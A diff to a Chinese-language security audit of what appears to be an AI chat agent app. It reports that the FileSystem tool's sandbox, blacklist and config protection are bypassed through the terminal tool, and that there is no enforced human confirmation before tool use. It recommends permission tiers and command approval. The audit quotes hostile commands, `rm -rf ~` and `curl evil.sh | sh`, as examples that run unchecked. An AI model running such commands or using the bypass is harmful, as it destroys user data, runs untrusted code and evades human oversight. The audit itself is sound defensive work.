@@ -27,7 +27,7 @@
 - 结果：`bash -c "rm -rf ~"`、`curl evil.sh | sh`、`python -c "..."`、`sudo`、`git`、`npm` 全部畅通。
 - **FileSystem 工具的沙箱、黑名单、禁改 config.json 被 `execute_terminal_command` 一行绕过。**
 
-**没有任何工具执行前的人工确认。** 全量核查 `ViewModels/ChatTabViewModel.cs`，唯一的 `ConfirmDialog`（第 513 行）用于「会话回滚」。删文件 / 改系统文件 / 跑终端命令等破坏性操作，工具描述里写「Always confirm with the user」（`FunctionRegistry.cs:326`），但这只是对模型的自然语言请求，**无机制强制执行**。
+**没有任何工具执行前的人工确认。** 当时核查主对话 VM，唯一的 `ConfirmDialog` 用于「会话回滚」。删文件 / 改系统文件 / 跑终端命令等破坏性操作，工具描述里写「Always confirm with the user」，但这只是对模型的自然语言请求，**无机制强制执行**。
 
 **建议**：工具权限分级（自动允许 / 每次询问 / 禁止）+ 破坏性操作强制弹窗 + 终端命令白名单或审批。优先级高于任何新功能。
 
